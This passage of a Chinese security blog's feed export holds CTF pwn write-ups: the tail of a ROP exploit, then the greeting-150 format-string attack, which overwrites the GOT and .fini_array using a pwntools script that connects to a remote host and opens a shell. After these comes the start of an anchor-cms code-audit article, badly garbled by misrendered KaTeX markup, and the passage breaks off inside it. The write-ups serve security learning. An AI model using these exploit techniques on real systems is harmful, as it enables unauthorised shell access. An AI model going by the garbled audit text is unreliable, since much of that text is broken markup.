class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload1 += p32(start_addr)<br>p.send(payload1)<br>p.recv()<br><br>ppp_addr = <span class="hljs-number">0x0804856c</span>  <span class="hljs-comment">#获取到的连续3次pop操作的gadget的地址 </span><br>payload2 = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>payload2 += p32(read_plt)<br>payload2 += p32(ppp_addr)<br>payload2 += p32(<span class="hljs-number">0</span>)<br>payload2 += p32(bss_addr)<br>payload2 += p32(<span class="hljs-number">8</span>)<br>payload2 += p32(sys_addr) + p32(vulnaddress) + p32(bss_addr)<br><span class="hljs-comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span><br><span class="hljs-comment">#构造read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span><br><span class="hljs-comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span><br>p.send(payload2)<br>p.send(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"><a class="markdownIt-Anchor" href="#攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环"></a> 攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环</h1>
<p>1.首先检查程序</p>
<p>​      <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221809095.png" alt="image-20210413221809095" style="zoom:67%;"></p>
<p>32位程序，只开启了栈保护和堆栈不可执行</p>
<p>2.用ida查看程序中的函数</p>
<p>主函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221907760.png" alt="image-20210413221907760" style="zoom:67%;">
<p>该程序的大致就是向v5读入64字节，读入成功后，将v5的内容输出到s里面，之后将s直接输出，这最后一个printf(&amp;s)存在一个格式化字符串漏洞，可以进行利用，进行任意地址读写</p>
<p>3.接下来需要测试偏移</p>
<p>输入</p>
<p>.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221928354.png" alt="image-20210413221928354"></p>
<p>可以看到对于该程序，输出的第43个字节是我们的”.”号的ASCII码值0x2e</p>
<p>但是该程序没有循环，就算是我们覆盖了got表的地址，也无法再次返回程序了，这时候我们需要用到一个可以使用格式化字符串漏洞使程序无限循环的漏洞</p>
<p>此漏洞原理为：写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。</p>
<p>具体流程如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221946280.png" alt="image-20210413221946280" style="zoom:67%;">
<p>简单地说，在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。</p>
<p>而我们的目标就是修改.fini_array数组的第一个元素为start。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，且程序可读取的字节数有限，因此需要一次性修改两个地址并且合理调整payload。</p>
<p>所以当main运行第一次时，将strlen函数的got表覆写成system的plt地址，然后将.fini._arra第一个元素覆写成strat地址，进而造成循环，第二次main函数时，输入“/bin/sh\x00”，在调用strlen函数时就会变成system(&quot;/bin/sh&quot;),进而拿到shell。</p>
<p>经过查看，system的plt表地址为0x8048490</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222012210.png" alt="image-20210413222012210" style="zoom:67%;"> 
<p>调用的fini_got = 0x8049934</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222025348.png" alt="image-20210413222025348" style="zoom:67%;">
<p>又知道这里的数据为0x80485A0,又因为main函数的地址为0x08485ED，所以我们只需要修改后2位的数据即可让调用fini的时候返回main函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222048628.png" alt="image-20210413222048628" style="zoom:67%;">
<p>然后通过查看知道strlen的got表地址为0x8049A54</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413222103549.png" alt="image-20210413222103549" style="zoom:67%;">
<p>综上所述</p>
<p>fini_got = 0x8049934</p>
<p>main_addr = 0x80485ED</p>
<p>strlen_got = 0x8049A54</p>
<p>system_plt = 0x8048490</p>
<p>因此设置一个数组为</p>
<p>arr = [</p>
<p>0x85ED,</p>
<p>0x8490,0x804</p>
<p>]</p>
<p>因此，我们要在fini_got写入2字节数据arr[0]</p>
<p>在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]</p>
<p>进而构造payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-number">46970</span>)   <br>fini_got = <span class="hljs-number">0x8049934</span>  <br>main_addr = <span class="hljs-number">0x80485ED</span>  <br>strlen_got = <span class="hljs-number">0x8049A54</span>  <br>system_plt = <span class="hljs-number">0x8048490</span>  <br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)  <br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">2</span>  <br>payload += p32(strlen_got)  <br>payload +=  p32(strlen_got+<span class="hljs-number">2</span>)  <br>payload += p32(fini_got)  <br>arr = [  <br>   <span class="hljs-number">0x85ED</span>,  <br>   <span class="hljs-number">0x8490</span>,<span class="hljs-number">0x804</span>  <br>]  <br><span class="hljs-comment">#hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  </span><br><span class="hljs-comment">#修改strlen GOT内容的前2字节  </span><br>num = arr[<span class="hljs-number">2</span>] - <span class="hljs-number">32</span>  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%13$hn&#x27;</span>  <br><span class="hljs-comment">#修改strlen GOT内容的后2字节  </span><br>num = arr[<span class="hljs-number">1</span>] - arr[<span class="hljs-number">2</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%12$hn&#x27;</span>  <br><span class="hljs-comment">#修改fini的后2字节  </span><br>num = arr[<span class="hljs-number">0</span>] - arr[<span class="hljs-number">1</span>]  <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num) + <span class="hljs-string">&#x27;c%14$hn&#x27;</span>  <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(payload)  <br>p.sendline(payload)  <br><span class="hljs-comment">#get shell   </span><br>p.recvuntil(<span class="hljs-string">&#x27;Please tell me your name... &#x27;</span>)   <br>p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)   <br>p.interactive()  <br><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>红日安全[代码审计]3则</title>
    <url>/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/</url>
    <content><![CDATA[<h1 id="红日安全代码审计3则"><a class="markdownIt-Anchor" href="#红日安全代码审计3则"></a> 红日安全[代码审计]3则</h1>
<h2 id="红日安全代码审计day-2-twig"><a class="markdownIt-Anchor" href="#红日安全代码审计day-2-twig"></a> 红日安全[代码审计]Day 2 – Twig</h2>
<h3 id="实例分析"><a class="markdownIt-Anchor" href="#实例分析"></a> 实例分析</h3>
<p>首先安装题中给的anchor-cms-0.9.2</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image002.jpg" alt="img" style="zoom: 80%;">
<p>当我们访问一个不存在的网页时，它会显示一个404页面</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image004.jpg" alt="img" style="zoom:80%;">
<p>这个页面的代码如下，注意这里的current_url()函数</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image006.jpg" alt="img" style="zoom:80%;">
<p>这个函数又调用了Uri类的current()方法</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image008.jpg" alt="img" style="zoom:80%;">
<p>在Uri类中static::$current = static::detect();又掉用了detect方法</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image010.jpg" alt="img" style="zoom:80%;">
<p>detect方法如下，它会获取 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>R</mi><mi>V</mi><mi>E</mi><mi>R</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><msup><mi mathvariant="normal">的</mi><mo mathvariant="normal">′</mo></msup><mi>R</mi><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><msub><mi>T</mi><mi>U</mi></msub><mi>R</mi><msup><mi>I</mi><mo mathvariant="normal">′</mo></msup><msup><mi mathvariant="normal">、</mi><mo mathvariant="normal">′</mo></msup><mi>P</mi><mi>A</mi><mi>T</mi><msub><mi>H</mi><mi>I</mi></msub><mi>N</mi><mi>F</mi><msup><mi>O</mi><mo mathvariant="normal">′</mo></msup><mo separator="true">,</mo><msup><mi mathvariant="normal">、</mi><mo mathvariant="normal">′</mo></msup><mi>O</mi><mi>R</mi><mi>I</mi><msub><mi>G</mi><mi>P</mi></msub><mi>A</mi><mi>T</mi><msub><mi>H</mi><mi>I</mi></msub><mi>N</mi><mi>F</mi><msup><mi>O</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">三</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">键</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">“</mi><mi>R</mi><mi>E</mi><mi>Q</mi><mi>U</mi><mi>E</mi><mi>S</mi><msub><mi>T</mi><mi>U</mi></msub><mi>R</mi><mi>I</mi><mi mathvariant="normal">”</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">访</mi><mi mathvariant="normal">问</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">页</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">所</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">的</mi><mi>U</mi><mi>R</mi><mi>I</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">“</mi><mi mathvariant="normal">/</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>e</mi><mi>x</mi><mi mathvariant="normal">.</mi><mi>h</mi><mi>t</mi><mi>m</mi><mi>l</mi><mi mathvariant="normal">”</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">_SERVER 数组中的 &#x27;REQUEST_URI&#x27; 、&#x27;PATH_INFO&#x27;, 、&#x27;ORIG_PATH_INFO&#x27; 三个键的值（“REQUEST_URI”是访问此页面所需的 URI。例如，“/index.html”），然后通过foreach(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord"><span class="mord cjk_fallback">的</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord cjk_fallback">、</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord cjk_fallback">、</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">三</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">键</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">（</span><span class="mord">“</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord">”</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">访</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">页</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">，</span><span class="mord">“</span><span class="mord">/</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord">.</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">”</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mopen">(</span></span></span></span>try as <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>e</mi><mi>t</mi><mi>h</mi><mi>o</mi><mi>d</mi><mo stretchy="false">)</mo><mi mathvariant="normal">依</mi><mi mathvariant="normal">次</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">满</mi><mi mathvariant="normal">足</mi></mrow><annotation encoding="application/x-tex">method)依次进行判断，如果满足</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mord cjk_fallback">依</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span></span></span></span>uri = filter_var(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>r</mi><mi>i</mi><mo separator="true">,</mo><mi>F</mi><mi>I</mi><mi>L</mi><mi>T</mi><mi>E</mi><msub><mi>R</mi><mi>S</mi></msub><mi>A</mi><mi>N</mi><mi>I</mi><mi>T</mi><mi>I</mi><mi>Z</mi><msub><mi>E</mi><mi>U</mi></msub><mi>R</mi><mi>L</mi><mo stretchy="false">)</mo><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">uri, FILTER_SANITIZE_URL)和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault">L</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span></span></span></span>uri = parse_url(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>r</mi><mi>i</mi><mo separator="true">,</mo><mi>P</mi><mi>H</mi><msub><mi>P</mi><mi>U</mi></msub><mi>R</mi><msub><mi>L</mi><mi>P</mi></msub><mi>A</mi><mi>T</mi><mi>H</mi><mo stretchy="false">)</mo><mi mathvariant="normal">这</mi><mi mathvariant="normal">两</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">条</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>c</mi><mo>:</mo><mo>:</mo><mi>f</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">uri, PHP_URL_PATH)这两个条件，就通过static::format(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mclose">)</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" 